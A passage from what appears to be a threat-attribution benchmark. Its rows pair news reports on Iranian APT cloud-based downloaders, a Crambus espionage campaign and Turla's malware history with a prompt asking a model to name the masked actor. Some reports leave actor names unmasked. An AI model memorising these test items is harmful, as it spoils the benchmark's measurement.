Cobalt Strike that provide many of the same functions” but is more difficult to detect.    The QuiteRAT malware is a smaller — 5 megabytes versus 18 megabytes — and more nimble version, and uses various code obfuscation techniques. [PLACEHOLDER]’ malware has a feature to gather device data and then go to sleep to hide from network scans. Talos researchers found three [PLACEHOLDER]-sponsored campaigns in the past year, so they continue to wreak havoc across the world.
https://www.darkreading.com/ics-ot-security/iran-oilrig-cyberattackers-target-israel-critical-infrastructure	Prolific Iranian advanced persistent threat group (APT) [PLACEHOLDER] has repeatedly targeted several Israeli organizations throughout 2022 in cyberattacks that were notable for leveraging a series of custom downloaders that use legitimate Microsoft cloud services to conduct attacker communications and exfiltrate data.    [PLACEHOLDER]  in the attacks deployed four specific new downloaders — SampleCheck5000 (SC5k v1-v3), ODAgent, OilCheck, and OilBooster — that were developed in the last year, adding the tools to the group's already large arsenal of custom malware, ESET researchers revealed in a blog post published Dec. 14.    Unique to the way the downloaders work versus other [PLACEHOLDER] tools is that they use various legitimate cloud services — including Microsoft OneDrive, Microsoft Graph OneDrive API, Microsoft Graph Outlook API, and Microsoft Office EWS API — for command-and-control communications (C2) and data exfiltration, the researchers said.    Attack targets so far have included a healthcare organization, a manufacturing company, a local governmental organization, and several other unidentified organizations, all in Israel and most of them previous targets for the APT.    The downloaders themselves are not particularly sophisticated, noted ESET researcher Zuzana Hromcová, who analyzed the malware along with ESET researcher Adam Burgher. However, there are other reasons that the group is evolving into a formidable adversary for targeted organizations, she said.    "The continuous development and testing of new variants, experimentation with various cloud services and different programming languages, and the dedication to re-compromise the same targets over and over again, make [PLACEHOLDER] a group to watch out for," Hromcová said in a press statement.    [PLACEHOLDER] has used these downloaders against only a limited number of targets, all of whom were persistently targeted months earlier by other tools employed by the group. The use of downloaders leveraging cloud services is an evasive tactic that allows the malware to blend more easily into the regular stream of network traffic — likely the reason that the APT uses them against repeat victims, according to ESET.    [PLACEHOLDER] APT: An Evolving, Persistent Threat  [PLACEHOLDER] is known to have been active since 2014, and primarily operates in the Middle East, targeting organizations in the region spanning a variety of industries, including but not limited to chemical, energy, financial, and telecommunications.    The group, which primarily deals in cyber espionage, was most recently tied to a supply chain attack in the UAE, but that's just one of many incidents to which it's been linked. In fact, last year, [PLACEHOLDER]'s various activities spurred the sanctioning of Iran's intelligence arm — which is believed to sponsor [PLACEHOLDER] — by the US government.    ESET identified the APT as the perpetrator of the repeated attacks on Israeli organizations via the similarity between the downloaders and other [PLACEHOLDER] tools that use email-based C2 protocols — namely, the MrPerfectionManager and PowerExchange backdoors.    [PLACEHOLDER] appears to be a creature of habit, repeating the same attack pattern on multiple occasions, the researchers noted. For example, between June and August 2022, ESET detected the OilBooster, SC5k v1, and SC5k v2 downloaders and the Shark backdoor, all in the network of a local governmental organization in Israel.    Later, ESET detected yet another SC5k version (v3) in the network of an Israeli healthcare organization, also a previous [PLACEHOLDER] victim. The APT also deployed ODAgent in the network of a manufacturing company in Israel, which previously was affected by both SC5k and OilCheck.    "[PLACEHOLDER] is persistent in targeting the same organizations, and determined to keep its foothold in compromised networks," the researchers warned.    ESET included a large list of indicators of compromise (IoC) in the blog post — including files, network activities, and techniques based on the MITRE ATT&CK framework — to help potential targets identify whether they might be compromised by the latest string of attacks.    Inside [PLACEHOLDER]'s Stealthy Backdoor Malware  All of the downloaders are written in C++/.NET except OilBooster, which is written in Microsoft Visual C/C++. They all each have their own separate functionality and behave with some key differences.    Common between them is the use of a shared email or cloud storage account to exchange messages with the [PLACEHOLDER] operators that can be used against multiple victims. The downloaders access this account to download commands and additional payloads staged by the operators, as well as to upload command output and staged files.    SC5k, which has several variants, is the first of the downloaders that appeared on the scene (as early as November 2021), using legitimate cloud services. All of the variants use the Microsoft Office EWS API to interact with a shared Exchange mail account as a way to download additional payloads and commands, as well as to upload data.    OilCheck, discovered in April 2022, also uses draft messages created in a shared email account for both directions of C2 communication. However, unlike SC5k, OilCheck uses the REST-Microsoft Graph API to access a shared Microsoft 365 Outlook email account, not the SOAP-based Microsoft Office EWS API.    OilBooster also uses the Microsoft Graph API to connect to a Microsoft 365 account, but unlike OilCheck, it uses this API to interact with a OneDrive account controlled by the attackers for C2 communication and exfiltration rather than an Outlook account, the researchers said. OilBooster's capabilities include downloading files from the remote server, executing files and shell commands, and exfiltrating the results.    ODAgent uses the Microsoft Graph API to access an attacker-controlled OneDrive account for C2 communication and exfiltration and is believed to be a precursor of OilBooster, according to the researchers.    "Similar to OilBooster," they wrote, "ODAgent repeatedly connects to the shared OneDrive account and lists the contents of the victim-specific folder to obtain additional payloads and backdoor commands."	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Prolific Iranian advanced persistent threat group (APT) [PLACEHOLDER] has repeatedly targeted several Israeli organizations throughout 2022 in cyberattacks that were notable for leveraging a series of custom downloaders that use legitimate Microsoft cloud services to conduct attacker communications and exfiltrate data.    [PLACEHOLDER]  in the attacks deployed four specific new downloaders — SampleCheck5000 (SC5k v1-v3), ODAgent, OilCheck, and OilBooster — that were developed in the last year, adding the tools to the group's already large arsenal of custom malware, ESET researchers revealed in a blog post published Dec. 14.    Unique to the way the downloaders work versus other [PLACEHOLDER] tools is that they use various legitimate cloud services — including Microsoft OneDrive, Microsoft Graph OneDrive API, Microsoft Graph Outlook API, and Microsoft Office EWS API — for command-and-control communications (C2) and data exfiltration, the researchers said.    Attack targets so far have included a healthcare organization, a manufacturing company, a local governmental organization, and several other unidentified organizations, all in Israel and most of them previous targets for the APT.    The downloaders themselves are not particularly sophisticated, noted ESET researcher Zuzana Hromcová, who analyzed the malware along with ESET researcher Adam Burgher. However, there are other reasons that the group is evolving into a formidable adversary for targeted organizations, she said.    "The continuous development and testing of new variants, experimentation with various cloud services and different programming languages, and the dedication to re-compromise the same targets over and over again, make [PLACEHOLDER] a group to watch out for," Hromcová said in a press statement.    [PLACEHOLDER] has used these downloaders against only a limited number of targets, all of whom were persistently targeted months earlier by other tools employed by the group. The use of downloaders leveraging cloud services is an evasive tactic that allows the malware to blend more easily into the regular stream of network traffic — likely the reason that the APT uses them against repeat victims, according to ESET.    [PLACEHOLDER] APT: An Evolving, Persistent Threat  [PLACEHOLDER] is known to have been active since 2014, and primarily operates in the Middle East, targeting organizations in the region spanning a variety of industries, including but not limited to chemical, energy, financial, and telecommunications.    The group, which primarily deals in cyber espionage, was most recently tied to a supply chain attack in the UAE, but that's just one of many incidents to which it's been linked. In fact, last year, [PLACEHOLDER]'s various activities spurred the sanctioning of Iran's intelligence arm — which is believed to sponsor [PLACEHOLDER] — by the US government.    ESET identified the APT as the perpetrator of the repeated attacks on Israeli organizations via the similarity between the downloaders and other [PLACEHOLDER] tools that use email-based C2 protocols — namely, the MrPerfectionManager and PowerExchange backdoors.    [PLACEHOLDER] appears to be a creature of habit, repeating the same attack pattern on multiple occasions, the researchers noted. For example, between June and August 2022, ESET detected the OilBooster, SC5k v1, and SC5k v2 downloaders and the Shark backdoor, all in the network of a local governmental organization in Israel.    Later, ESET detected yet another SC5k version (v3) in the network of an Israeli healthcare organization, also a previous [PLACEHOLDER] victim. The APT also deployed ODAgent in the network of a manufacturing company in Israel, which previously was affected by both SC5k and OilCheck.    "[PLACEHOLDER] is persistent in targeting the same organizations, and determined to keep its foothold in compromised networks," the researchers warned.    ESET included a large list of indicators of compromise (IoC) in the blog post — including files, network activities, and techniques based on the MITRE ATT&CK framework — to help potential targets identify whether they might be compromised by the latest string of attacks.    Inside [PLACEHOLDER]'s Stealthy Backdoor Malware  All of the downloaders are written in C++/.NET except OilBooster, which is written in Microsoft Visual C/C++. They all each have their own separate functionality and behave with some key differences.    Common between them is the use of a shared email or cloud storage account to exchange messages with the [PLACEHOLDER] operators that can be used against multiple victims. The downloaders access this account to download commands and additional payloads staged by the operators, as well as to upload command output and staged files.    SC5k, which has several variants, is the first of the downloaders that appeared on the scene (as early as November 2021), using legitimate cloud services. All of the variants use the Microsoft Office EWS API to interact with a shared Exchange mail account as a way to download additional payloads and commands, as well as to upload data.    OilCheck, discovered in April 2022, also uses draft messages created in a shared email account for both directions of C2 communication. However, unlike SC5k, OilCheck uses the REST-Microsoft Graph API to access a shared Microsoft 365 Outlook email account, not the SOAP-based Microsoft Office EWS API.    OilBooster also uses the Microsoft Graph API to connect to a Microsoft 365 account, but unlike OilCheck, it uses this API to interact with a OneDrive account controlled by the attackers for C2 communication and exfiltration rather than an Outlook account, the researchers said. OilBooster's capabilities include downloading files from the remote server, executing files and shell commands, and exfiltrating the results.    ODAgent uses the Microsoft Graph API to access an attacker-controlled OneDrive account for C2 communication and exfiltration and is believed to be a precursor of OilBooster, according to the researchers.    "Similar to OilBooster," they wrote, "ODAgent repeatedly connects to the shared OneDrive account and lists the contents of the victim-specific folder to obtain additional payloads and backdoor commands."
https://www.darkreading.com/cyberattacks-data-breaches/iran-linked-muddywater-spies-middle-east-govt-eight-months	The Iranian state-aligned advanced persistent threat (APT) known as [PLACEHOLDER] used an arsenal of new custom malware tools to spy on an unnamed Middle Eastern government for eight months, in just the latest of its many campaigns in the region.    That's according to Symantec, which describes a, at times, daily effort to steal sensitive government data by [PLACEHOLDER], which Symantec tracks as "Crambus."     Despite penetrating a dozen computers, deploying half a dozen different hacking tools, and stealing passwords and files, the campaign managed to stay under the radar, lasting from February until September before being disrupted.    "They accessed quite a broad range of computers on the network, so it seems to be a more general attack, rather than going after anything specific," assesses Dick O'Brien, principal intelligence analyst for Symantec.    [PLACEHOLDER]'s Malware Arsenal  [PLACEHOLDER]'s latest campaign began on Feb. 1, when an unknown PowerShell script was executed from a suspicious directory on a targeted machine.    In the months that followed, the group deployed four custom malware tools, three previously unknown to the cybersecurity community.    First there's Backdoor.Tokel, for downloading files and executing arbitrary PowerShell commands. Trojan.Dirps is also used for PowerShell commands, and enumerating files in a directory. Infostealer.Clipog is, as the name would suggest, infostealer malware capable of keylogging, logging processes where keystrokes are entered, and copying clipboard data.    Finally there's Backdoor.PowerExchange, discovered but not specifically attributed to [PLACEHOLDER] back in May. The PowerShell-based tool logs into Microsoft Exchange Servers with hardcoded credentials, using them for command-and-control (C2), and monitoring for emails sent by the attackers. Mail with "@@" in the subject line conceal instructions for writing and stealing files, or executing arbitrary PowerShell commands.    Alongside its own weaponry, [PLACEHOLDER] also utilized two popular open source hacking tools: Mimikatz for credential dumping, and Plink for remote shell capabilities.    According to O'Brien, the group's months long staying power can be attributed to its choice of weaponry:    "If you introduce new tools, and if you're using legitimate tools, there are no automatic red flags. [As an analyst] you kind of have to wait until there's a notification of potentially malicious activity, and start pulling the threads from there."    [PLACEHOLDER] Is Back  [PLACEHOLDER] has been around since at least 2014, according to Mandiant. A few years back, though, it was written off. "Crambus was one of those groups that we thought might go away because they were heavily exposed in a leak, seemingly by a former contractor or team member," O'Brien points out.    Now, he adds, "they're definitely back."	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The Iranian state-aligned advanced persistent threat (APT) known as [PLACEHOLDER] used an arsenal of new custom malware tools to spy on an unnamed Middle Eastern government for eight months, in just the latest of its many campaigns in the region.    That's according to Symantec, which describes a, at times, daily effort to steal sensitive government data by [PLACEHOLDER], which Symantec tracks as "Crambus."     Despite penetrating a dozen computers, deploying half a dozen different hacking tools, and stealing passwords and files, the campaign managed to stay under the radar, lasting from February until September before being disrupted.    "They accessed quite a broad range of computers on the network, so it seems to be a more general attack, rather than going after anything specific," assesses Dick O'Brien, principal intelligence analyst for Symantec.    [PLACEHOLDER]'s Malware Arsenal  [PLACEHOLDER]'s latest campaign began on Feb. 1, when an unknown PowerShell script was executed from a suspicious directory on a targeted machine.    In the months that followed, the group deployed four custom malware tools, three previously unknown to the cybersecurity community.    First there's Backdoor.Tokel, for downloading files and executing arbitrary PowerShell commands. Trojan.Dirps is also used for PowerShell commands, and enumerating files in a directory. Infostealer.Clipog is, as the name would suggest, infostealer malware capable of keylogging, logging processes where keystrokes are entered, and copying clipboard data.    Finally there's Backdoor.PowerExchange, discovered but not specifically attributed to [PLACEHOLDER] back in May. The PowerShell-based tool logs into Microsoft Exchange Servers with hardcoded credentials, using them for command-and-control (C2), and monitoring for emails sent by the attackers. Mail with "@@" in the subject line conceal instructions for writing and stealing files, or executing arbitrary PowerShell commands.    Alongside its own weaponry, [PLACEHOLDER] also utilized two popular open source hacking tools: Mimikatz for credential dumping, and Plink for remote shell capabilities.    According to O'Brien, the group's months long staying power can be attributed to its choice of weaponry:    "If you introduce new tools, and if you're using legitimate tools, there are no automatic red flags. [As an analyst] you kind of have to wait until there's a notification of potentially malicious activity, and start pulling the threads from there."    [PLACEHOLDER] Is Back  [PLACEHOLDER] has been around since at least 2014, according to Mandiant. A few years back, though, it was written off. "Crambus was one of those groups that we thought might go away because they were heavily exposed in a leak, seemingly by a former contractor or team member," O'Brien points out.    Now, he adds, "they're definitely back."
https://cyware.com/resources/research-and-analysis/symphony-of-intrusion-turla-apts-orchestrated-attacks-across-borders-ddd5	[PLACEHOLDER] is a Russian-based threat group operating since at least 2004. Linked to the Russian Federal Security Service (FSB), the APT group has been able to position itself as a sophisticated and elusive adversary that orchestrates targeted and converted attacks.  Turla has targeted victims across 45 countries, spanning various sectors, such as government, military, education, research, and pharmaceuticals. Notably, the threat group played an active role in the Russian-Ukraine conflict in  February 2022, engaging in espionage attacks against Ukraine's defense sector.    While primarily focused on Windows machines, Turla possesses tools capable of targeting macOS and Linux systems. [PLACEHOLDER] was chosen to be the main focus for the 2023 MITRE ATT&CK evaluation. MITRE describes Turla as being “known for their targeted intrusions and innovative stealth.”    Infection Techniques  Turla employs a diverse range of sophisticated strategies, encompassing living-off-the-land techniques, watering hole attacks, targeted spear-phishing emails, and the exploitation of compromised satellite connections. Utilizing publicly available tools like Metasploit and PowerShell, alongside Command and Control (C2) infrastructure, such as Google Drive and Dropbox, Turla showcases versatility.     A key facet of their approach involves deploying second-stage malware post-initial infection, creating a backdoor for network access. Notably, Turla has demonstrated an exceptional level of threat sophistication, employing distinctive malware capable of extracting data from air-gapped systems through innovative audio exfiltration techniques. The actor, in 2015, exploited satellite communications, using a legitimate user's IP address to transmit stolen data via satellite. An antenna connected to their C2 server facilitated data reception.    Malware Tools and TTPs  The Turla hacking group is known for deploying an extensive array of custom-developed malware, coupled with the utilization of publicly accessible tools and the exploitation of known vulnerabilities, to accomplish its objectives.    Snake: Active since 2003, Snake is a sophisticated modular backdoor in Turla's arsenal, demonstrating extensive capabilities, including communication protocols, a kernel module for stealth, and keylogger functionality. Operation MEDUSA disrupted Snake's activity in 2023, revealing its global reach and a high level of software development capability by its authors.    ComRAT: Dating back to 2007, ComRAT (Agent.btz) is one of the actors’ oldest backdoors, evolving to version 4 by 2020. Deployed using PowerShell implants, such as PowerStallion, ComRAT's main objective is to steal and exfiltrate confidential documents from high-value targets, posing a long-standing threat.    Carbon: In use since 2014, Carbon is a modular backdoor framework within the group’s toolkit. Featuring P2P communication capabilities, Carbon facilitates command distribution across infected machines on a network, demonstrating the threat actor's adaptability and persistence over several years.    Kopiluwak: Discovered in 2016, Kopiluwak operates as a multilayered JavaScript spreader/downloader in Turla's toolkit. Used in various attacks, including a G20-themed attack in 2017, Kopiluwak gathers initial profiling information, emphasizing its role in the initial stages of compromise.    Kazuar: Discovered in 2017, Kazuar is a .NET backdoor with a potent command set, allowing remote access and plugin loading. In 2021, ties were found between Kazuar and the SUNBURST backdoor used in the SolarWinds Operation. Pensive Ursa utilized Kazuar in a 2023 Ukrainian espionage operation, showcasing its adaptability and potential impact on targeted systems.    HyperStack: First observed in 2018, HyperStack (SilentMoo, BigBoss) is an RPC backdoor utilized by Pensive Ursa in operations targeting government entities in Europe. Sharing similarities with Carbon, such as encryption schemes and configuration file formats, HyperStack enables control over compromised machines in a local network.    QUIETCANARY: Pensive Ursa utilized QUIETCANARY, a lightweight .NET backdoor, since 2019, deploying it in tandem with Kopiluwak for attacks in Ukraine. With the ability to execute various commands, download payloads, and employ RC4 encryption for C2 communication, QUIETCANARY represents a concerning element in Pensive Ursa's toolkit.    Crutch: Uncovered in December 2020, Crutch is a second-stage backdoor in Pensive Ursa's tactics, targeting European entities. Leveraging Dropbox for C2 communication, Crutch showcases the threat actor's adept use of legitimate services for nefarious purposes, highlighting the need for advanced defense strategies.    TinyTurla: Discovered by Talos in 2021, TinyTurla is a backdoor with features like downloading additional payloads, uploading files to the C2 server, and executing other processes. Its emergence in the US, EU, and Asia underscores Pensive Ursa's global reach and ongoing threat landscape.    Capibar: Capibar (aka DeliveryCheck or GAMEDAY) emerged in 2022 as a Turla backdoor, employed for espionage against Ukrainian defense forces. Distributed via email with malicious macros, Capibar establishes persistence through scheduled tasks, granting full control of compromised MS Exchange servers, posing a threat to critical infrastructure.    While Turla continues to use the aforementioned malware and tools, here are some other malware/backdoors it has used in the past: Mosquito, Outlook, IcedCoffee, WhiteBear, WhiteAtlas, LightNeuron, Tavdig, Skipper, RocketMan!, and ANDROMEDA.    In addition to these custom tools, Turla has been known to exploit various security vulnerabilities in popular software, such as Microsoft Windows, Adobe Flash, and Oracle Java, to gain initial access and escalate privileges within target systems.    Targeted Attacks  Turla's targets span the globe, with a notable concentration in European, Asian, and Middle Eastern countries. The countries it has affected are France, Romania, Kazakhstan, Poland, Tajikistan, Austria, Russia, the United States, Saudi Arabia, Germany, India, Armenia, Belarus, the Netherlands, Iran, Uzbekistan, and Iraq.    Turla has been implicated in several significant cyberespionage campaigns:    Moonlight Maze (1996-1998): Initiated in 1996, this early cyberespionage campaign targeted the U.S., breaching various government systems, including the US Navy, Air Force, NASA, Department of Energy, EPA, and NOAA. Researchers linked the operation to Turla in 2016, suggesting Moonlight Maze was an early manifestation of Turla.    Agent.btz (2008): This was a major attack on the U.S. Department of Defense. The Agent.btz virus infected the classified network of the DOD's US Central Command. Additionally,  at least 400,000 computers across Russia and Europe were infected. This breach prompted the Buckshot Yankee initiative and the establishment of the U.S. Cyber Command.    Epic Turla: The global multistage cyberespionage campaign primarily targeted Eastern Europe. It reportedly compromised hundreds of systems across sectors in over 45 countries. The attacks used at least two zero-day exploits CVE-2013-5065 and CVE-2013-3346 and generated spearphishing e-mails with malicious PDF attachments.    WITCHCOVEN (2015): Turla compromised over 100 websites under this operation, collecting data on potential victims using web analytics and open-source tools. The injected code, known as "WITCHCOVEN," aimed to build user profiles for espionage through a persistent tracking cookie.    RUAG Espionage (2016): Swiss defense company RUAG fell victim to a sophisticated cyberespionage campaign that resulted in the theft of sensitive data related to Swiss military technology. The attack lasted for around two years and a total of 23GB of data were exfiltrated from the network.    In 2019, Turla was found running an attack campaign hitting 13 organizations across 10 different countries in three different campaigns, which involved a swath of new tools. These campaigns were wide-ranging, hitting targets in Europe, Latin America, and South Asia.    Mitigation and Prevention    To defend against shapeshifting threat actors such as Turla, organizations require a 360-degree investigation of every suspicious alert captured by detection systems. However, security teams grapple with the immense influx of IOCs that lack contextual insights. Threat data collected from various sources requires significant processing, including de-duplication, normalization, and enrichment with context and correlation. Cyware’s Intel Exchange (CTIX), an automated threat intelligence platform provides capabilities for effectively operationalizing threat intelligence. By combining it with Respond (CFTR), an automated incident response and threat analysis platform, security teams can track the evolution of sophisticated threats like [PLACEHOLDER] and leverage enriched intel to connect the dots between external intel, internal telemetry, and historical incidents for proactive defense.    Other than that, always have multifactor authentication in place and train employees how to distinguish effectively between phishing emails and the actual ones. Regularly back up your most important data.    Conclusion  The impact of succumbing to a [PLACEHOLDER] attack carries substantial risk, extending beyond mere financial losses and data breaches to the potential compromise of critical infrastructure. This scenario could pose significant national security and geopolitical consequences. Consequently, it is imperative for organizations, irrespective of size or industry, to prioritize robust security strategies and allocate resources to implement multifaceted security measures. This approach is crucial in fortifying defenses against the increasing threat posed by APT groups, exemplified by entities like [PLACEHOLDER].	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER] is a Russian-based threat group operating since at least 2004. Linked to the Russian Federal Security Service (FSB), the APT group has been able to position itself as a sophisticated and elusive adversary that orchestrates targeted and converted attacks.  Turla has targeted victims across 45 countries, spanning various sectors, such as government, military, education, research, and pharmaceuticals. Notably, the threat group played an active role in the Russian-Ukraine conflict in  February 2022, engaging in espionage attacks against Ukraine's defense sector.    While primarily focused on Windows machines, Turla possesses tools capable of targeting macOS and Linux systems. [PLACEHOLDER] was chosen to be the main focus for the 2023 MITRE ATT&CK evaluation. MITRE describes Turla as being “known for their targeted intrusions and innovative stealth.”    Infection Techniques  Turla employs a diverse range of sophisticated strategies, encompassing living-off-the-land techniques, watering hole attacks, targeted spear-phishing emails, and the exploitation of compromised satellite connections. Utilizing publicly available tools like Metasploit and PowerShell, alongside Command and Control (C2) infrastructure, such as Google Drive and Dropbox, Turla showcases versatility.     A key facet of their approach involves deploying second-stage malware post-initial infection, creating a backdoor for network access. Notably, Turla has demonstrated an exceptional level of threat sophistication, employing distinctive malware capable of extracting data from air-gapped systems through innovative audio exfiltration techniques. The actor, in 2015, exploited satellite communications, using a legitimate user's IP address to transmit stolen data via satellite. An antenna connected to their C2 server facilitated data reception.    Malware Tools and TTPs  The Turla hacking group is known for deploying an extensive array of custom-developed malware, coupled with the utilization of publicly accessible tools and the exploitation of known vulnerabilities, to accomplish its objectives.    Snake: Active since 2003, Snake is a sophisticated modular backdoor in Turla's arsenal, demonstrating extensive capabilities, including communication protocols, a kernel module for stealth, and keylogger functionality. Operation MEDUSA disrupted Snake's activity in 2023, revealing its global reach and a high level of software development capability by its authors.    ComRAT: Dating back to 2007, ComRAT (Agent.btz) is one of the actors’ oldest backdoors, evolving to version 4 by 2020. Deployed using PowerShell implants, such as PowerStallion, ComRAT's main objective is to steal and exfiltrate confidential documents from high-value targets, posing a long-standing threat.    Carbon: In use since 2014, Carbon is a modular backdoor framework within the group’s toolkit. Featuring P2P communication capabilities, Carbon facilitates command distribution across infected machines on a network, demonstrating the threat actor's adaptability and persistence over several years.    Kopiluwak: Discovered in 2016, Kopiluwak operates as a multilayered JavaScript spreader/downloader in Turla's toolkit. Used in various attacks, including a G20-themed attack in 2017, Kopiluwak gathers initial profiling information, emphasizing its role in the initial stages of compromise.    Kazuar: Discovered in 2017, Kazuar is a .NET backdoor with a potent command set, allowing remote access and plugin loading. In 2021, ties were found between Kazuar and the SUNBURST backdoor used in the SolarWinds Operation. Pensive Ursa utilized Kazuar in a 2023 Ukrainian espionage operation, showcasing its adaptability and potential impact on targeted systems.    HyperStack: First observed in 2018, HyperStack (SilentMoo, BigBoss) is an RPC backdoor utilized by Pensive Ursa in operations targeting government entities in Europe. Sharing similarities with Carbon, such as encryption schemes and configuration file formats, HyperStack enables control over compromised machines in a local network.    QUIETCANARY: Pensive Ursa utilized QUIETCANARY, a lightweight .NET backdoor, since 2019, deploying it in tandem with Kopiluwak for attacks in Ukraine. With the ability to execute various commands, download payloads, and employ RC4 encryption for C2 communication, QUIETCANARY represents a concerning element in Pensive Ursa's toolkit.    Crutch: Uncovered in December 2020, Crutch is a second-stage backdoor in Pensive Ursa's tactics, targeting European entities. Leveraging Dropbox for C2 communication, Crutch showcases the threat actor's adept use of legitimate services for nefarious purposes, highlighting the need for advanced defense strategies.    TinyTurla: Discovered by Talos in 2021, TinyTurla is a backdoor with features like downloading additional payloads, uploading files to the C2 server, and executing other processes. Its emergence in the US, EU, and Asia underscores Pensive Ursa's global reach and ongoing threat landscape.    Capibar: Capibar (aka DeliveryCheck or GAMEDAY) emerged in 2022 as a Turla backdoor, employed for espionage against Ukrainian defense forces. Distributed via email with malicious macros, Capibar establishes persistence through scheduled tasks, granting full control of compromised MS Exchange servers, posing a threat to critical infrastructure.    While Turla continues to use the aforementioned malware and tools, here are some other malware/backdoors it has used in the past: Mosquito, Outlook, IcedCoffee, WhiteBear, WhiteAtlas, LightNeuron, Tavdig, Skipper, RocketMan!, and ANDROMEDA.    In addition to these custom tools, Turla has been known to exploit various security vulnerabilities in popular software, such as Microsoft Windows, Adobe Flash, and Oracle Java, to gain initial access and escalate privileges within target systems.    Targeted Attacks  Turla's targets span the globe, with a notable concentration in European, Asian, and Middle Eastern countries. The countries it has affected are France, Romania, Kazakhstan, Poland, Tajikistan, Austria, Russia, the United States, Saudi Arabia, Germany, India, Armenia, Belarus, the Netherlands, Iran, Uzbekistan, and Iraq.    Turla has been implicated in several significant cyberespionage campaigns:    Moonlight Maze (1996-1998): Initiated in 1996, this early cyberespionage campaign targeted the U.S., breaching various government systems, including the US Navy, Air Force, NASA, Department of Energy, EPA, and NOAA. Researchers linked the operation to Turla in 2016, suggesting Moonlight Maze was an early manifestation of Turla.    Agent.btz (2008): This was a major attack on the U.S. Department of Defense. The Agent.btz virus infected the classified network of the DOD's US Central Command. Additionally,  at least 400,000 computers across Russia and Europe were infected. This breach prompted the Buckshot Yankee initiative and the establishment of the U.S. Cyber Command.    Epic Turla: The global multistage cyberespionage campaign primarily targeted Eastern Europe. It reportedly compromised hundreds of systems across sectors in over 45 countries. The attacks used at least two zero-day exploits CVE-2013-5065 and CVE-2013-3346 and generated spearphishing e-mails with malicious PDF attachments.    WITCHCOVEN (2015): Turla compromised over 100 websites under this operation, collecting data on potential victims using web analytics and open-source tools. The injected code, known as "WITCHCOVEN," aimed to build user profiles for espionage through a persistent tracking cookie.    RUAG Espionage (2016): Swiss defense company RUAG fell victim to a sophisticated cyberespionage campaign that resulted in the theft of sensitive data related to Swiss military technology. The attack lasted for around two years and a total of 23GB of data were exfiltrated from the network.    In 2019, Turla was found running an attack campaign hitting 13 organizations across 10 different countries in three different campaigns, which involved a swath of new tools. These campaigns were wide-ranging, hitting targets in Europe, Latin America, and South Asia.    Mitigation and Prevention    To defend against shapeshifting threat actors such as Turla, organizations require a 360-degree investigation of every suspicious alert captured by detection systems. However, security teams grapple with the immense influx of IOCs that lack contextual insights. Threat data collected from various sources requires significant processing, including de-duplication, normalization, and enrichment with context and correlation. Cyware’s Intel Exchange (CTIX), an automated threat intelligence platform provides capabilities for effectively operationalizing threat intelligence. By combining it with Respond (CFTR), an automated incident response and threat analysis platform, security teams can track the evolution of sophisticated threats like [PLACEHOLDER] and leverage enriched intel to connect the dots between external intel, internal telemetry, and historical incidents for proactive defense.    Other than that, always have multifactor authentication in place and train employees how to distinguish effectively between phishing emails and the actual ones. Regularly back up your most important data.    Conclusion  The impact of succumbing to a [PLACEHOLDER] attack carries substantial risk, extending beyond mere financial losses and data breaches to the potential compromise of critical infrastructure. This scenario could pose significant national security and geopolitical consequences. Consequently, it is imperative for organizations, irrespective of size or industry, to prioritize robust security strategies and allocate resources to implement multifaceted security measures. This approach is crucial in fortifying defenses against the increasing threat posed by APT groups, exemplified by entities like [PLACEHOLDER].